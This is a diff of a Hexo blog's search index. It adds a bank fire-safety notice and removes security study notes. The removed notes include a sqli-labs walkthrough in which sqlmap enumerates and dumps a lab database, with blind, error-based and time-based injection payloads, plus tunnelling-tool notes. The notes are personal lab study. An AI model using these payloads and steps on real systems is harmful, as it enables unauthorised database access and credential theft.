@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2021年1月消防安全</title>
+    <url>/2021/01/18/2021%E5%B9%B41%E6%9C%88%E6%B6%88%E9%98%B2%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h1 id="2021年1月消防安全"><a href="#2021年1月消防安全" class="headerlink" title="2021年1月消防安全"></a>2021年1月消防安全</h1><h3 id="强化消防意识"><a href="#强化消防意识" class="headerlink" title="强化消防意识"></a>强化消防意识</h3><p>冬春季节是火灾高发期，分行进一步增强做好冬春火灾防控工作的责任感紧迫感，在全员中牢固树立“关注消防、生命至上”理念和“预防为主”鲜明导向，从严从实从细抓好火灾防控宽度、深度、力度防控。</p>
+<h3 id="强化隐患排查"><a href="#强化隐患排查" class="headerlink" title="强化隐患排查"></a>强化隐患排查</h3><p>分行进一步对重点部位开展排查，包括办公场所、营业网点大厅、自助银行加钞间、消防应急疏散通道、安全出口重点要害部位，人员密集场所，以问题为导向，早发现、早排除并彻底整改。经排查消防安全情况正常。</p>
+<h3 id="强化责任落实"><a href="#强化责任落实" class="headerlink" title="强化责任落实"></a>强化责任落实</h3><p>认真贯彻落实消防安全制度，全员签订消防安全责任状将安全管理责任具体化、责任体系层级化、责任追究明晰化，敦促责任人履职到位，防范到位，对消防设施设备监测维护到位，致力打造安全银行。定期开展日常防火检查巡查，排查整治隐患，依法依规开展生产经营活动，保障人员、设备机器和场所处于良好的安全状态，确保本单位消防安全符合规范。</p>
+]]></content>
+      <categories>
+        <category>消防</category>
+      </categories>
+      <tags>
+        <tag>消防</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2020/09/21/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
@@ -22,174 +36,6 @@
       </categories>
       <tags>
         <tag>sql_injection</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo quick start</title>
-    <url>/2021/01/18/hexo%20quick%20start/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
-<h2 id="Hexo-Quick-Start"><a href="#Hexo-Quick-Start" class="headerlink" title="Hexo Quick Start"></a>Hexo Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="Next-theme-setting"><a href="#Next-theme-setting" class="headerlink" title="Next theme setting"></a>Next theme setting</h2><h3 id="1-Install-next-through-curl"><a href="#1-Install-next-through-curl" class="headerlink" title="1.Install next through curl"></a>1.Install next through curl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir themes&#x2F;next</span><br><span class="line">$ curl -s https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;iissnan&#x2F;hexo-theme-next&#x2F;releases&#x2F;latest | grep tarball_url | cut -d &#39;&quot;&#39; -f 4 | wget -i - -O- | tar -zx -C themes&#x2F;next --strip-components&#x3D;1</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-Update-the-next-theme"><a href="#2-Update-the-next-theme" class="headerlink" title="2.Update the next theme"></a>2.Update the next theme</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd themes&#x2F;next</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-Edit-the-config-yml-and-change-to-next-theme"><a href="#3-Edit-the-config-yml-and-change-to-next-theme" class="headerlink" title="3.Edit the _config.yml,and change to next theme"></a>3.Edit the _config.yml,and change to next theme</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Themes: https:&#x2F;&#x2F;hexo.io&#x2F;themes&#x2F;</span><br><span class="line">#theme: landscape</span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-Next-has-four-style"><a href="#4-Next-has-four-style" class="headerlink" title="4.Next has four style"></a>4.Next has four style</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse  &#x2F;&#x2F;默认主题</span><br><span class="line">#scheme: Mist</span><br><span class="line">#scheme: Pisces</span><br><span class="line">#scheme: Gemini</span><br></pre></td></tr></table></figure>
-
-<h2 id="Menu-setting"><a href="#Menu-setting" class="headerlink" title="Menu setting"></a>Menu setting</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># When running the site in a subdirectory (e.g. domain.tld&#x2F;blog), remove the leading slash (&#x2F;archives -&gt; archives)</span><br><span class="line"># the sequense</span><br><span class="line">menu:</span><br><span class="line">  home: &#x2F;</span><br><span class="line">  categories: &#x2F;categories&#x2F;</span><br><span class="line">  archives: &#x2F;archives&#x2F;</span><br><span class="line">  tags: &#x2F;tags&#x2F;</span><br><span class="line">  about: &#x2F;about&#x2F;</span><br><span class="line">  #sitemap: &#x2F;sitemap.xml</span><br><span class="line">  #commonweal: &#x2F;404&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Tags-setting"><a href="#Tags-setting" class="headerlink" title="Tags setting"></a>Tags setting</h3><h4 id="add-tags"><a href="#add-tags" class="headerlink" title="add tags"></a>add tags</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># add tags</span><br><span class="line">$ hexo new page &quot;tags&quot;</span><br></pre></td></tr></table></figure>
-
-<h4 id="edit-index-md"><a href="#edit-index-md" class="headerlink" title="edit index.md"></a>edit index.md</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: All tags</span><br><span class="line">date: 2018-01-20 18:57:48</span><br><span class="line">type: &quot;tags&quot;    #this is need to add.</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<h3 id="other-Menu-options-is-the-same-to-tags"><a href="#other-Menu-options-is-the-same-to-tags" class="headerlink" title="other Menu options is the same to tags"></a>other Menu options is the same to tags</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  such as categories、about。after add categories (hexo new page &quot;categories&quot;)，创建的文件内容填写如下</span><br><span class="line">---</span><br><span class="line">title: All categories</span><br><span class="line">date: 2018-01-20 18:57:48</span><br><span class="line">type: &quot;categories&quot;## this is need to add</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<h2 id="add-search-in-the-site"><a href="#add-search-in-the-site" class="headerlink" title="add search in the site"></a>add search in the site</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br><span class="line">$ npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line">#edit _config.yml</span><br><span class="line"># Local search</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;flashlab&#x2F;hexo-generator-search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>hexo use</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>others</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入-关于url中井号的理解</title>
-    <url>/2021/01/18/sql%E6%B3%A8%E5%85%A5-%E5%85%B3%E4%BA%8Eurl%E4%B8%AD%E4%BA%95%E5%8F%B7%E7%9A%84%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[<p>关于url and #的理解</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello World!&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">			&lt;p&gt;</span><br><span class="line">				User ID:</span><br><span class="line">				&lt;input type&#x3D;&quot;text&quot; size&#x3D;&quot;15&quot; name&#x3D;&quot;id&quot;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">			&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if ($_GET[&quot;id&quot;])</span><br><span class="line">    echo &quot;Hello World!&quot;.&quot;id is &quot;.$_GET[&quot;id&quot;];</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>#，提交到当前页面</p>
-<p>_GET可以取出提交的值。</p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql_injection</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入-判断是字符型还是整型</title>
-    <url>/2021/01/18/sql%E6%B3%A8%E5%85%A5-%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E5%9E%8B/</url>
-    <content><![CDATA[<p>?id=1 and 1=2</p>
-<p>来自百度：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zhidao.baidu.com&#x2F;question&#x2F;1952853439075012508.html</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>总结这个问题如下：<br>SELECT uname,email FROM userinfo WHERE id = ‘1 and 1=3’ ;<br>这句SQL是可以查询到结果的,当然前提是有id=1的数据。<br>其实，1后面的字符可以是任意的，不会影响查询，它甚至可以是：<br>SELECT uname,email FROM userinfo WHERE id = ‘1dsasasdasasd’ ;<br>那么为什么会这样呢？<br>经过测试，我发现这是因为id的类型为数值型,例如int，而查询的时候传入的是字符串，而MYSQL是十分智能的，它会进行类型转换，但是这个转换过程是很随意的，就像varchar 的’2asdasd’会被转成int的 2。<br>当然，如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’2adsdasd’等类似的数据由于数据库里没有匹配项,查询结果为空。</p>
-</blockquote>
-<hr>
-<p>卧槽是正确的</p>
-<p>分析：</p>
-<p>假设id在数据库的类型是数值型如int。</p>
-<p><img src="https://i.loli.net/2021/01/14/COMHfYWKqTRimDn.png" alt="image-20210114143843875"></p>
-<p>上图可得出，传给id的是一个字符串，数据库会进行一个转换，id=’1’转换为id=1</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.sqli-labs.com&#x2F;Less-1&#x2F;?id&#x3D;1dsasasdasasd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/f8y6but93clasXF.png" alt="image-20210114144015677"></p>
-<p>上图可得出，传给id的是一个字符串，数据库会进行一个转换，id=’1dsasasdasasd’转换为id=1</p>
-<p>原理同上，验证正确。</p>
-<p>综上，假设正确，id为int型。进源代码查看如下：正确。</p>
-<p><img src="https://i.loli.net/2021/01/14/mqc1yu8w9VZGDRU.png" alt="image-20200907233834055"></p>
-<hr>
-<p>分析如下：</p>
-<blockquote>
-<p>经过测试，我发现这是因为id的类型为数值型,例如int，而查询的时候传入的是字符串，而MYSQL是十分智能的，它会进行类型转换，但是这个转换过程是很随意的，就像varchar 的’2asdasd’会被转成int的 2。<br>当然，如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’2adsdasd’等类似的数据由于数据库里没有匹配项,查询结果为空。</p>
-</blockquote>
-<p>牛逼，应该是这样。</p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql_injection</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-lab notes not the same</title>
-    <url>/2020/09/22/sqli-lab-notes-less5/</url>
-    <content><![CDATA[<h2 id="sqli-labs-less5"><a href="#sqli-labs-less5" class="headerlink" title="sqli-labs-less5"></a>sqli-labs-less5</h2><h3 id="find-a-vulnerable-point"><a href="#find-a-vulnerable-point" class="headerlink" title="find a vulnerable point."></a>find a vulnerable point.</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y&#x2F;N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 9046&#x3D;9046 AND &#39;rjhe&#39;&#x3D;&#39;rjhe</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 3356 FROM(SELECT COUNT(*),CONCAT(0x716b7a7871,(SELECT (ELT(3356&#x3D;3356,1))),0x71626b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;OjIE&#39;&#x3D;&#39;OjIE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 8875 FROM (SELECT(SLEEP(5)))zVCV) AND &#39;RNxr&#39;&#x3D;&#39;RNxr</span><br><span class="line">---</span><br><span class="line">[17:17:08] [INFO] the back-end DBMS is MySQL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="find-dbs"><a href="#find-dbs" class="headerlink" title="find dbs"></a>find dbs</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:18:40] [INFO] fetching database names</span><br><span class="line">[17:18:42] [INFO] retrieved: &#39;information_schema&#39;</span><br><span class="line">[17:18:43] [INFO] retrieved: &#39;challenges&#39;</span><br><span class="line">[17:18:44] [INFO] retrieved: &#39;mysql&#39;</span><br><span class="line">[17:18:45] [INFO] retrieved: &#39;performance_schema&#39;</span><br><span class="line">[17:18:46] [INFO] retrieved: &#39;security&#39;</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] challenges</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] security</span><br></pre></td></tr></table></figure>
-
-<h3 id="find-tables"><a href="#find-tables" class="headerlink" title="find tables"></a>find tables</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:19:55] [INFO] fetching tables for database: &#39;security&#39;</span><br><span class="line">[17:19:57] [INFO] retrieved: &#39;emails&#39;</span><br><span class="line">[17:19:58] [INFO] retrieved: &#39;referers&#39;</span><br><span class="line">[17:19:59] [INFO] retrieved: &#39;uagents&#39;</span><br><span class="line">[17:20:00] [INFO] retrieved: &#39;users&#39;</span><br><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
-
-<h3 id="find-columns"><a href="#find-columns" class="headerlink" title="find columns"></a>find columns</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security -T users --columns</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:21:00] [INFO] fetching columns for table &#39;users&#39; in database &#39;security&#39;</span><br><span class="line">[17:21:03] [INFO] retrieved: &#39;id&#39;</span><br><span class="line">[17:21:04] [INFO] retrieved: &#39;int(3)&#39;</span><br><span class="line">[17:21:05] [INFO] retrieved: &#39;username&#39;</span><br><span class="line">[17:21:06] [INFO] retrieved: &#39;varchar(20)&#39;</span><br><span class="line">[17:21:07] [INFO] retrieved: &#39;password&#39;</span><br><span class="line">[17:21:08] [INFO] retrieved: &#39;varchar(20)&#39;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
-
-<h3 id="get-data"><a href="#get-data" class="headerlink" title="get data"></a>get data</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:22:25] [INFO] fetching entries of column(s) &#39;id, password, username&#39; for table &#39;users&#39; in database &#39;security&#39;</span><br><span class="line">[17:22:31] [INFO] retrieved: &#39;1&#39;</span><br><span class="line">[17:22:32] [INFO] retrieved: &#39;Dumb&#39;</span><br><span class="line">[17:22:33] [INFO] retrieved: &#39;Dumb&#39;</span><br><span class="line">[17:22:34] [INFO] retrieved: &#39;2&#39;</span><br><span class="line">[17:22:35] [INFO] retrieved: &#39;I-kill-you&#39;</span><br><span class="line">[17:22:36] [INFO] retrieved: &#39;Angelina&#39;</span><br><span class="line">[17:22:37] [INFO] retrieved: &#39;3&#39;</span><br><span class="line">[17:22:38] [INFO] retrieved: &#39;p@ssword&#39;</span><br><span class="line">[17:22:39] [INFO] retrieved: &#39;Dummy&#39;</span><br><span class="line">[17:22:40] [INFO] retrieved: &#39;4&#39;</span><br><span class="line">[17:22:42] [INFO] retrieved: &#39;crappy&#39;</span><br><span class="line">[17:22:43] [INFO] retrieved: &#39;secure&#39;</span><br><span class="line">[17:22:44] [INFO] retrieved: &#39;5&#39;</span><br><span class="line">[17:22:45] [INFO] retrieved: &#39;stupidity&#39;</span><br><span class="line">[17:22:46] [INFO] retrieved: &#39;stupid&#39;</span><br><span class="line">[17:22:47] [INFO] retrieved: &#39;6&#39;</span><br><span class="line">[17:22:48] [INFO] retrieved: &#39;genious&#39;</span><br><span class="line">[17:22:49] [INFO] retrieved: &#39;superman&#39;</span><br><span class="line">[17:22:50] [INFO] retrieved: &#39;7&#39;</span><br><span class="line">[17:22:51] [INFO] retrieved: &#39;mob!le&#39;</span><br><span class="line">[17:22:52] [INFO] retrieved: &#39;batman&#39;</span><br><span class="line">[17:22:53] [INFO] retrieved: &#39;8&#39;</span><br><span class="line">[17:22:55] [INFO] retrieved: &#39;admin&#39;</span><br><span class="line">[17:22:56] [INFO] retrieved: &#39;admin&#39;</span><br><span class="line">[17:22:57] [INFO] retrieved: &#39;9&#39;</span><br><span class="line">[17:22:58] [INFO] retrieved: &#39;admin1&#39;</span><br><span class="line">[17:22:59] [INFO] retrieved: &#39;admin1&#39;</span><br><span class="line">[17:23:00] [INFO] retrieved: &#39;10&#39;</span><br><span class="line">[17:23:01] [INFO] retrieved: &#39;admin2&#39;</span><br><span class="line">[17:23:02] [INFO] retrieved: &#39;admin2&#39;</span><br><span class="line">[17:23:03] [INFO] retrieved: &#39;11&#39;</span><br><span class="line">[17:23:04] [INFO] retrieved: &#39;admin3&#39;</span><br><span class="line">[17:23:05] [INFO] retrieved: &#39;admin3&#39;</span><br><span class="line">[17:23:07] [INFO] retrieved: &#39;12&#39;</span><br><span class="line">[17:23:08] [INFO] retrieved: &#39;dumbo&#39;</span><br><span class="line">[17:23:09] [INFO] retrieved: &#39;dhakkan&#39;</span><br><span class="line">[17:23:10] [INFO] retrieved: &#39;14&#39;</span><br><span class="line">[17:23:11] [INFO] retrieved: &#39;admin4&#39;</span><br><span class="line">[17:23:12] [INFO] retrieved: &#39;admin4&#39;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
-
-<p>over.</p>
-]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql_injection</tag>
-        <tag>sqli_labs</tag>
-        <tag>sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网穿透-nps-notes</title>
-    <url>/2020/09/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-nps-notes/</url>
-    <content><![CDATA[<p>nps notes</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021-01-13</span><br><span class="line">参考：</span><br><span class="line">来着github</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps&#x2F;blob&#x2F;master&#x2F;README_zh.md</span><br><span class="line"></span><br><span class="line">来自哔哩哔哩</span><br><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV12E411B7Ns?from&#x3D;search&amp;seid&#x3D;15898087636535266347</span><br><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1b7411D7Fw?from&#x3D;search&amp;seid&#x3D;6562851621532130301</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">做微信公众号开发、小程序开发等----&gt; 域名代理模式</span><br><span class="line"></span><br><span class="line">想在外网通过ssh连接内网的机器，做云服务器到内网服务器端口的映射，----&gt; tcp代理模式</span><br><span class="line"></span><br><span class="line">在非内网环境下使用内网dns，或者需要通过udp访问内网机器等----&gt; udp代理模式</span><br><span class="line"></span><br><span class="line">在外网使用HTTP代理访问内网站点----&gt; http代理模式</span><br><span class="line"></span><br><span class="line">搭建一个内网穿透ss，在外网如同使用内网vpn一样访问内网资源或者设备----&gt; socks5代理模式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理...</span><br><span class="line">全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</span><br><span class="line">控制全面，同时支持服务端和客户端控制</span><br><span class="line">https集成，支持将后端代理和web服务转成https，同时支持多证书</span><br><span class="line">操作简单，只需简单的配置即可在web ui上完成其余操作</span><br><span class="line">展示信息全面，流量、系统信息、即时带宽、客户端版本等</span><br><span class="line">扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</span><br><span class="line">域名解析具备自定义header、404页面配置、host修改、站点保护、URL路由、泛解析等功能</span><br><span class="line">服务端支持多用户和用户注册功能</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">快速开始</span><br><span class="line">安装</span><br><span class="line">releases</span><br><span class="line">下载对应的系统版本即可，服务端和客户端是单独的</span><br><span class="line"></span><br><span class="line">服务端启动</span><br><span class="line">下载完服务器压缩包后，解压，然后进入解压后的文件夹</span><br><span class="line"></span><br><span class="line">执行安装命令</span><br><span class="line">对于linux|darwin sudo .&#x2F;nps install</span><br><span class="line"></span><br><span class="line">对于windows，管理员身份运行cmd，进入安装目录 nps.exe install</span><br><span class="line"></span><br><span class="line">默认端口</span><br><span class="line">nps默认配置文件使用了80，443，8080，8024端口</span><br><span class="line"></span><br><span class="line">80与443端口为域名解析模式默认端口</span><br><span class="line"></span><br><span class="line">8080为web管理访问端口</span><br><span class="line"></span><br><span class="line">8024为网桥端口，用于客户端与服务器通信</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line">对于linux|darwin sudo nps start</span><br><span class="line"></span><br><span class="line">对于windows，管理员身份运行cmd，进入程序目录 nps.exe start</span><br><span class="line"></span><br><span class="line">安装后windows配置文件位于 C:\Program Files\nps，linux和darwin位于&#x2F;etc&#x2F;nps</span><br><span class="line"></span><br><span class="line">如果发现没有启动成功，可以查看日志(Windows日志文件位于当前运行目录下，linux和darwin位于&#x2F;var&#x2F;log&#x2F;nps.log)</span><br><span class="line"></span><br><span class="line">访问服务端ip:web服务端口（默认为8080）</span><br><span class="line">使用用户名和密码登陆（默认admin&#x2F;123，正式使用一定要更改）</span><br><span class="line">创建客户端</span><br><span class="line">客户端连接</span><br><span class="line">点击web管理中客户端前的+号，复制启动命令</span><br><span class="line">执行启动命令，linux直接执行即可，windows将.&#x2F;npc换成npc.exe用cmd执行</span><br><span class="line">如果需要注册到系统服务可查看注册到系统服务</span><br><span class="line"></span><br><span class="line">配置</span><br><span class="line">客户端连接后，在web中配置对应穿透服务即可</span><br><span class="line">更多高级用法见完整文档</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://i.loli.net/2020/09/24/sSWeDmLgHAKlJIk.png" alt="image-20200924002317330"></p>
-<p><img src="https://i.loli.net/2020/09/24/Dqrd9VxwZY6AE2W.png" alt="image-20200924002400305"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;npc.exe -server&#x3D;119.2*****.19:8024 -vkey&#x3D;**********4x6bzyc6g09 -type&#x3D;tcp</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://i.loli.net/2020/09/24/WMPYCBDyKz1p7Ev.png" alt="image-20200924002516982"></p>
-<p><img src="https://i.loli.net/2020/09/24/fylNG3jpMLbCiXe.png" alt="image-20200924002635118"></p>
